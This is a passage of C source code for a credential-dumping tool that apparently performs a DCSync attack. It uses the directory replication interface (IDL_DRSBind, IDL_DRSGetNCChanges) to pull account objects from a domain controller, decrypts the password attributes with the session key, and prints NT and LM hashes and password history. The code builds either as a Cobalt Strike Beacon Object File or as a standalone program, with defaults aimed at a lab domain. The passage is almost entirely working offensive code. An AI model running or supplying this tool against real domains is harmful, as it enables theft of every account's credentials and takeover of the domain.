                            ATTRBLOCK* pAttrBlock = &pCurrent->Entinf.AttrBlock;
                            verbose_printf( "    Attributes: %u\n", pAttrBlock->attrCount );
                            if ( pAttrBlock->attrCount > 0 && pAttrBlock->pAttr == NULL )
                            {
                                internal_printf( "    [!] Attribute pointer is NULL\n" );
                                pCurrent = pCurrent->pNextEntInf;
                                objIndex++;
                                continue;
                            }

                            /*  Extract RID - check objectSid first, fallback to pName->Sid  */
                            DWORD dwRID = 0;

                            /*  Try objectSid attribute first  */
                            for ( ULONG ridIdx = 0; ridIdx < pAttrBlock->attrCount; ridIdx++ )
                            {
                                if ( pAttrBlock->pAttr[ridIdx].attrTyp == 0x00090092 &&
                                     pAttrBlock->pAttr[ridIdx].AttrVal.valCount > 0 &&
                                     pAttrBlock->pAttr[ridIdx].AttrVal.pAVal != NULL )
                                {
                                    ATTRVAL* pSidVal = &pAttrBlock->pAttr[ridIdx].AttrVal.pAVal[0];
                                    if ( pSidVal->valLen >= 12 && pSidVal->pVal != NULL )
                                    {
                                        /*  RID is the last 4 bytes of the SID  */
                                        dwRID = *(DWORD*)( pSidVal->pVal + pSidVal->valLen - 4 );
                                        verbose_printf( "    RID (from objectSid): %u (0x%x)\n", dwRID, dwRID );
                                    }
                                    break;
                                }
                            }

                            /*  Fallback: Try to get RID from DSNAME->Sid if available  */
                            if ( dwRID == 0 && pCurrent->Entinf.pName != NULL && pCurrent->Entinf.pName->SidLen > 0 )
                            {
                                BYTE* pSid = (BYTE*)&pCurrent->Entinf.pName->Sid;
                                if ( pCurrent->Entinf.pName->SidLen >= 12 )
                                {
                                    dwRID = *(DWORD*)( pSid + pCurrent->Entinf.pName->SidLen - 4 );
                                    verbose_printf( "    RID (from DSNAME->Sid): %u (0x%x)\n", dwRID, dwRID );
                                }
                            }

                            if ( dwRID == 0 )
                            {
                                internal_printf( "    [!] RID not found, cannot decrypt password hashes\n" );
                            }

                            for ( ULONG i = 0; i < pAttrBlock->attrCount; i++ )
                            {
                                ATTR* pAttr = &pAttrBlock->pAttr[i];
                                if ( !IsInterestingAttr( pAttr->attrTyp ) )
                                {
                                    continue;
                                }

                                verbose_printf( "      [%u] attrTyp: 0x%08x, values: %u\n",
                                    i, pAttr->attrTyp, pAttr->AttrVal.valCount );

                                if ( pAttr->AttrVal.valCount > 0 && pAttr->AttrVal.pAVal == NULL )
                                {
                                    internal_printf( "          [!] Attribute value pointer is NULL\n" );
                                    continue;
                                }

                                /*  Process attribute values  */
                                for ( ULONG j = 0; j < pAttr->AttrVal.valCount; j++ )
                                {
                                    ATTRVAL* pVal = &pAttr->AttrVal.pAVal[j];
                                    verbose_printf( "          Value %u: %u bytes\n", j, pVal->valLen );

                                    if ( ( pAttr->attrTyp == ATT_SAM_ACCOUNT_NAME ||
                                           pAttr->attrTyp == ATT_USER_PRINCIPAL_NAME ) &&
                                         pVal->valLen > 0 && pVal->pVal != NULL )
                                    {
                                        verbose_printf( "          [*] %s: %.*S\n",
                                            pAttr->attrTyp == ATT_SAM_ACCOUNT_NAME ? "sAMAccountName" : "userPrincipalName",
                                            pVal->valLen / sizeof( WCHAR ),
                                            (WCHAR*)pVal->pVal );
                                    }

                                    /*  Decrypt password attributes  */
                                    if ( ShouldDecryptAttr( pAttr->attrTyp ) &&
                                         pVal->valLen > 0 && pVal->pVal != NULL &&
                                         g_pSessionKey != NULL )
                                    {
                                        BYTE* pDecrypted = NULL;
                                        DWORD dwDecryptedLen = 0;

                                        if ( DecryptAttributeWithSessionKey( g_pSessionKey, g_dwSessionKeyLen, pVal->pVal, pVal->valLen, &pDecrypted, &dwDecryptedLen ) )
                                        {
                                            if ( pAttr->attrTyp == ATT_UNICODE_PWD )
                                            {
                                                PrintRidHashList( "NT Hash", pDecrypted, dwDecryptedLen, dwRID );
                                            }
                                            else if ( pAttr->attrTyp == ATT_SUPPLEMENTAL_CREDENTIALS )
                                            {
                                                verbose_printf( "          [*] Supplemental Credentials decrypted (%u bytes)\n", dwDecryptedLen );
                                                ParseSupplementalCredentials( pDecrypted, dwDecryptedLen );
                                            }
#ifndef BOF
                                            else if ( pAttr->attrTyp == ATT_DBCS_PWD )
                                            {
                                                PrintRidHashList( "LM Hash", pDecrypted, dwDecryptedLen, dwRID );
                                            }
                                            else if ( pAttr->attrTyp == ATT_NT_PWD_HISTORY )
                                            {
                                                PrintRidHashList( "NT History", pDecrypted, dwDecryptedLen, dwRID );
                                            }
                                            else if ( pAttr->attrTyp == ATT_LM_PWD_HISTORY )
                                            {
                                                PrintRidHashList( "LM History", pDecrypted, dwDecryptedLen, dwRID );
                                            }
#endif

                                            intFree( pDecrypted );
                                        }
                                        else
                                        {
                                            internal_printf( "          [!] Decryption failed\n" );
                                        }
                                    }

#ifdef DCSYNC_DEBUG
                                    /*  Print hex dump of encrypted data  */
                                    if ( pVal->valLen > 0 && pVal->pVal != NULL )
                                    {
                                        ULONG dumpLen = pVal->valLen > 32 ? 32 : pVal->valLen;
                                        internal_printf( "          Encrypted: " );
                                        for ( ULONG k = 0; k < dumpLen; k++ )
                                        {
                                            internal_printf( "%02x ", pVal->pVal[k] );
                                            if ( ( k + 1 ) % 16 == 0 && k + 1 < dumpLen )
                                            {
                                                internal_printf( "\n                     " );
                                            }
                                        }
                                        if ( pVal->valLen > 32 )
                                        {
                                            internal_printf( "... (%u more bytes)", pVal->valLen - 32 );
                                        }
                                        internal_printf( "\n" );
                                    }
#endif
                                }
                            }

                            pCurrent = pCurrent->pNextEntInf;
                            objIndex++;
                        }
                    }
                    else
                    {
                        internal_printf( "[!] No objects returned\n" );
                    }
                }
                else
                {
                    internal_printf( "[!] Unsupported reply version: %u\n", dwOutVersion );
                }
            }
            else
            {
                internal_printf( "[!] IDL_DRSGetNCChanges error code: %u\n", drsStatus );
            }
        }
        else
        {
            internal_printf( "[!] No server extensions returned\n" );
            goto END;
        }
    }
    else
    {
        internal_printf( "[!] IDL_DRSBind error code: %u\n", drsStatus );
        goto END;
    }

END:
    /*  Cleanup resources  */
    if ( drsHandle )
    {
        IDL_DRSUnbind( &drsHandle );
    }

    if ( pUserDsName )
    {
        intFree( pUserDsName );
    }

    if ( pDrsExtensionsInt )
    {
        intFree( pDrsExtensionsInt );
    }

    if ( g_pSessionKey )
    {
        intFree( g_pSessionKey );
        g_pSessionKey = NULL;
        g_dwSessionKeyLen = 0;
    }

    if ( bHandle )
    {
        RPCRT4$RpcBindingFree( &bHandle );
    }

    internal_printf( "[>] Done" );
    return;
}

#ifdef BOF
VOID go(
    IN PCHAR Buffer,
    IN ULONG Length
)
{
    if ( !bofstart() )
    {
        return;
    }

    LPWSTR userDN;
    LPWSTR domainDN;
    LPWSTR domainController;

    datap parser;
    BeaconDataParse( &parser, Buffer, Length );
    userDN = (WCHAR*)BeaconDataExtract( &parser, NULL );
    domainDN = (WCHAR*)BeaconDataExtract( &parser, NULL );
    domainController = (WCHAR*)BeaconDataExtract( &parser, NULL );

    if ( userDN == NULL || domainDN == NULL || domainController == NULL )
    {
        internal_printf( "[!] userDN, domainDN, and domainController must be specified" );
        printoutput( TRUE );
        return;
    }

    execute( userDN, domainDN, domainController );

    printoutput( TRUE );
};
#else
static LPWSTR ArgToWide( const char* arg )
{
    int wideLen = MultiByteToWideChar( CP_UTF8, 0, arg, -1, NULL, 0 );
    LPWSTR wideArg = NULL;

    if ( wideLen == 0 )
    {
        wideLen = MultiByteToWideChar( CP_ACP, 0, arg, -1, NULL, 0 );
    }

    if ( wideLen == 0 )
    {
        return NULL;
    }

    wideArg = (LPWSTR)intAlloc( wideLen * sizeof( WCHAR ) );
    if ( wideArg == NULL )
    {
        return NULL;
    }

    if ( MultiByteToWideChar( CP_UTF8, 0, arg, -1, wideArg, wideLen ) == 0 &&
         MultiByteToWideChar( CP_ACP, 0, arg, -1, wideArg, wideLen ) == 0 )
    {
        intFree( wideArg );
        return NULL;
    }

    return wideArg;
}

int main( int argc, char** argv )
{
    LPWSTR userDN = NULL;
    LPWSTR domainDN = NULL;
    LPWSTR domainController = NULL;

    setvbuf( stdout, NULL, _IONBF, 0 );

    if ( argc == 4 )
    {
        userDN = ArgToWide( argv[1] );
        domainDN = ArgToWide( argv[2] );
        domainController = ArgToWide( argv[3] );

        if ( userDN == NULL || domainDN == NULL || domainController == NULL )
        {
            internal_printf( "[!] Failed to convert command line arguments\n" );
            goto END;
        }
    }
    else
    {
        internal_printf( "[*] Usage: %s <targetDN> <domainDN> <domainController>\n", argv[0] );
        internal_printf( "[*] Using NORTH lab defaults\n" );
        userDN = L"CN=eddard.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local";
        domainDN = L"DC=north,DC=sevenkingdoms,DC=local";
        domainController = L"winterfell.north.sevenkingdoms.local";
    }

    execute( userDN, domainDN, domainController );

END:
    if ( argc == 4 )
    {
        if ( userDN )
        {
            intFree( userDN );
        }
        if ( domainDN )
        {
            intFree( domainDN );
        }
        if ( domainController )
        {
            intFree( domainController );
        }
    }

    return 0;
}
#endif
